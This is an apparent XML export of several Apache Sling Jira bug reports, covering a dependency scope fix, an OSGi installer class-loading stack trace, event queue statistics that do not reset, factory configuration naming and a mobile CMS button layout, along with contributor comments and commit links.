                            <comment id="17721532" author="enorman" created="Wed, 10 May 2023 19:37:20 +0000"  >&lt;p&gt;Merged PR at: &#160;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/commit/51838fe3b1dea7f534be8cbc9728e47485538c2b&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;51838fe&lt;/tt&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 24 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hpe8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11858] Fix Scope of org.jetbrains:annotations in Events / Events API</title>
                <link>https://issues.apache.org/jira/browse/SLING-11858</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Found by Stefan Seifert:&#160;&lt;/p&gt;

&lt;p&gt;on both modules org.jetbrains:annotations was added with compile scope - should be provided. although not a problem for the bundle in OSGi runtime, it should be fixed.&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13534997">SLING-11858</key>
            <summary>Fix Scope of org.jetbrains:annotations in Events / Events API</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Thu, 4 May 2023 13:59:55 +0000</created>
                <updated>Fri, 12 May 2023 01:25:35 +0000</updated>
                            <resolved>Mon, 8 May 2023 15:10:39 +0000</resolved>
                                                    <fixVersion>Event 4.3.12</fixVersion>
                    <fixVersion>Event API 1.0.4</fixVersion>
                                    <component>Event</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17720557" author="dklco" created="Mon, 8 May 2023 15:37:05 +0000"  >&lt;p&gt;fixed in:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-event-api/commit/51eadd0a27327579c37039e4619d41cd61ac04fe&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-event-api/commit/51eadd0a27327579c37039e4619d41cd61ac04fe&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-event/commit/ccae75df9f3a6e5bb9f7d2926b5e46ed14bc368d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-event/commit/ccae75df9f3a6e5bb9f7d2926b5e46ed14bc368d&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 24 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1how8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11857] OsgiInstallationListener is not throwing DynamicClassLoader exceptions</title>
                <link>https://issues.apache.org/jira/browse/SLING-11857</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;We are using a Sling based application (AEM) where we have multiple frameworks installed. We are trying to upgrade a framework to a newer version, but when doing this, at random it throws the following exception (even though the installhook provider is not used in that specific package?). I see that there is a fix in version 1.1.0 of the installhook provider, but this doesn&apos;t seem to fix it.&lt;/p&gt;

&lt;p&gt;Anyone has a clue on what might be going wrong here and how to fix this?&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
28.04.2023 05:36:02.758 *ERROR* [OsgiInstallerImpl] org.apache.sling.commons.classloader.impl.ClassLoaderFacade Dynamic &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;loader has already been deactivated.
org.apache.sling.commons.classloader.impl.ClassLoaderFacade$StackTraceProbe: Dynamic &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;loader has already been deactivated.
&#160; at org.apache.sling.commons.classloader.impl.ClassLoaderFacade.checkManagerActive(ClassLoaderFacade.java:69) [org.apache.sling.commons.classloader:1.4.2]
&#160; at org.apache.sling.commons.classloader.impl.ClassLoaderFacade.loadClass(ClassLoaderFacade.java:133) [org.apache.sling.commons.classloader:1.4.2]
&#160; at java.base/java.lang.&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.loadClass(&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.java:575)
&#160; at java.base/java.net.FactoryURLClassLoader.loadClass(URLClassLoader.java:904)
&#160; at java.base/java.lang.&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.loadClass(&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.java:521)
&#160; at org.apache.sling.installer.provider.installhook.OsgiInstallerListener.onEvent(OsgiInstallerListener.java:56)
&#160; at org.apache.sling.installer.core.impl.InstallListener.onEvent(InstallListener.java:97) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.EntityResourceList.setFinishState(EntityResourceList.java:311) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.EntityResourceList.setFinishState(EntityResourceList.java:337) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.api.tasks.InstallTask.setFinishedState(InstallTask.java:118) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.tasks.BundleStartTask.setFinishedState(BundleStartTask.java:64) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.api.tasks.InstallTask.setFinishedState(InstallTask.java:93) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.tasks.BundleStartTask.execute(BundleStartTask.java:98) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.OsgiInstallerImpl.doExecuteTasks(OsgiInstallerImpl.java:914) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.OsgiInstallerImpl.executeTasks(OsgiInstallerImpl.java:749) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.OsgiInstallerImpl.run(OsgiInstallerImpl.java:298) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at java.base/java.lang.&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.run(&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.java:834)
28.04.2023 05:36:02.759 *ERROR* [OsgiInstallerImpl] org.apache.sling.installer.core.impl.OsgiInstallerImpl Uncaught exception during task execution!
java.lang.NoClassDefFoundError: org/apache/sling/installer/api/event/InstallationEvent
&#160; at org.apache.sling.installer.provider.installhook.OsgiInstallerListener.onEvent(OsgiInstallerListener.java:56)
&#160; at org.apache.sling.installer.core.impl.InstallListener.onEvent(InstallListener.java:97) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.EntityResourceList.setFinishState(EntityResourceList.java:311) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.EntityResourceList.setFinishState(EntityResourceList.java:337) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.api.tasks.InstallTask.setFinishedState(InstallTask.java:118) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.tasks.BundleStartTask.setFinishedState(BundleStartTask.java:64) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.api.tasks.InstallTask.setFinishedState(InstallTask.java:93) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.tasks.BundleStartTask.execute(BundleStartTask.java:98) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.OsgiInstallerImpl.doExecuteTasks(OsgiInstallerImpl.java:914) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.OsgiInstallerImpl.executeTasks(OsgiInstallerImpl.java:749) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at org.apache.sling.installer.core.impl.OsgiInstallerImpl.run(OsgiInstallerImpl.java:298) [org.apache.sling.installer.core:3.9.0.B002]
&#160; at java.base/java.lang.&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.run(&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.java:834)
Caused by: java.lang.ClassNotFoundException: org.apache.sling.installer.api.event.InstallationEvent
&#160; at java.base/java.net.URLClassLoader.findClass(URLClassLoader.java:476)
&#160; at java.base/java.lang.&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.loadClass(&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.java:588)
&#160; at java.base/java.net.FactoryURLClassLoader.loadClass(URLClassLoader.java:904)
&#160; at java.base/java.lang.&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.loadClass(&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.java:521)
&#160; ... 12 common frames omitted
&#160; &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13534682">SLING-11857</key>
            <summary>OsgiInstallationListener is not throwing DynamicClassLoader exceptions</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="royteeuwen">Roy Teeuwen</reporter>
                        <labels>
                    </labels>
                <created>Tue, 2 May 2023 12:16:07 +0000</created>
                <updated>Tue, 2 May 2023 12:16:07 +0000</updated>
                                                                                <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 25 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hmyg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11856] Statistics for Sling Event Queue do not reset correctly</title>
                <link>https://issues.apache.org/jira/browse/SLING-11856</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When doing a reset on the statistics, the activeJobs and queuedJobs are not correctly reset.&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13534673">SLING-11856</key>
            <summary>Statistics for Sling Event Queue do not reset correctly</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="royteeuwen">Roy Teeuwen</reporter>
                        <labels>
                    </labels>
                <created>Tue, 2 May 2023 11:08:32 +0000</created>
                <updated>Tue, 14 Oct 2025 16:23:09 +0000</updated>
                                                                            <component>Event</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17719701" author="royteeuwen" created="Fri, 5 May 2023 07:14:41 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;&#160; could you have a look at this? You did the changes to the statistics last time&lt;/p&gt;</comment>
                            <comment id="17720196" author="cziegeler" created="Sat, 6 May 2023 10:18:49 +0000"  >&lt;p&gt;this is a long time since I looked at this, but not resetting the active and queued jobs was on purpose, as these are still in the system. Looking at your patch, you see that you now have to check the counters for being greater than zero - which really shouldn&apos;t be required.&lt;/p&gt;

&lt;p&gt;So my first thought is that the current code is correct,&#160;&lt;/p&gt;</comment>
                            <comment id="17720204" author="royteeuwen" created="Sat, 6 May 2023 11:19:50 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; the PR is because we are running against this in a prod instance, the counter is wrongly set to 48 active but there are no jobs whatsoever and no way to reset it. There should definitely be a way to reset it, now there is none&#8230;&lt;/p&gt;

&lt;p&gt;The negative check is actually an unrelated issue that I saw, if you call the statistics api wrongly, you can break it, I can revert that part if you think that this should be a real case, but i wouldnt expect so&lt;/p&gt;</comment>
                            <comment id="17720210" author="cziegeler" created="Sat, 6 May 2023 12:40:01 +0000"  >&lt;p&gt;Ok, so what happens in this case: there are 5 jobs in active state, you reset the statistic object - with the old implementation, active stays at 5, which I think is correct. WIth your change it goes down to zero - which is wrong because there are still 5 jobs active.&lt;/p&gt;

&lt;p&gt;If the active counter is wrong in your case, this hints to a bug somewhere else where the active count is not correctly decreased.&lt;/p&gt;</comment>
                            <comment id="17720213" author="royteeuwen" created="Sat, 6 May 2023 13:07:08 +0000"  >&lt;p&gt;Wouldn&#8217;t it make more sense to recalculate the active jobs based on the actual job manager api when doing a reset then? Or isnt that feasible&lt;/p&gt;</comment>
                            <comment id="17720224" author="cziegeler" created="Sat, 6 May 2023 14:35:17 +0000"  >&lt;p&gt;Recalculation is probably expensive, but for sure doable. What worries me is that it seems that the statistics data does not seem to be correct - which means there is some bug somewhere with handling that data. I would rather prefer to fix that part.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 24 weeks, 4 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hmwg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11855] Conversion of old factory config names to new one is not checking for tilde</title>
                <link>https://issues.apache.org/jira/browse/SLING-11855</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The code in&#160;&lt;br/&gt;
AbstractConfigurationEntryHandler#extractId converts an old factory configuration name into a new one (with a tilde). Unfortunately it only checks for a dash but not a tilde, which means in the case of&lt;br/&gt;
factory~a-b this is converted to factory~a~b instead of keeping it as factory~a-b&lt;br/&gt;
&#160;&lt;br/&gt;
A similar bug might lurk in other places dealing with factory configurations&lt;/p&gt;</description>
                <environment></environment>
        <key id="13534655">SLING-11855</key>
            <summary>Conversion of old factory config names to new one is not checking for tilde</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Tue, 2 May 2023 07:39:02 +0000</created>
                <updated>Mon, 8 May 2023 12:21:34 +0000</updated>
                            <resolved>Tue, 2 May 2023 07:48:38 +0000</resolved>
                                    <version>Content-Package to Feature Model Converter 1.3.0</version>
                                    <fixVersion>Content-Package to Feature Model Converter 1.3.2</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17718469" author="cziegeler" created="Tue, 2 May 2023 07:48:38 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/5f2c390fb3846d7f4dd11c4bdedc6bbf7df97613&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/5f2c390fb3846d7f4dd11c4bdedc6bbf7df97613&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 25 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hmsg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11853] CMS - Editor Submit Buttons Sporadically Un-selectable in Mobile</title>
                <link>https://issues.apache.org/jira/browse/SLING-11853</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When editing components on a mobile breakpoint the buttons to submit the form occasionally are positioned outside of the viewport and due to overflow: hidden CSS rules are not visible and thus cannot be clicked to submit the form.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13534440">SLING-11853</key>
            <summary>CMS - Editor Submit Buttons Sporadically Un-selectable in Mobile</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Fri, 28 Apr 2023 10:49:25 +0000</created>
                <updated>Thu, 9 Nov 2023 04:34:55 +0000</updated>
                            <resolved>Fri, 28 Apr 2023 10:51:39 +0000</resolved>
                                    <version>App CMS 1.1.6</version>
                                    <fixVersion>App CMS 1.1.8</fixVersion>
                                    <component>App CMS</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17717610" author="dklco" created="Fri, 28 Apr 2023 10:51:39 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-app-cms/commit/bb95f97e1f5b1bef773e3dd44288071d4be9b6ec&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-app-cms/commit/bb95f97e1f5b1bef773e3dd44288071d4be9b6ec&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
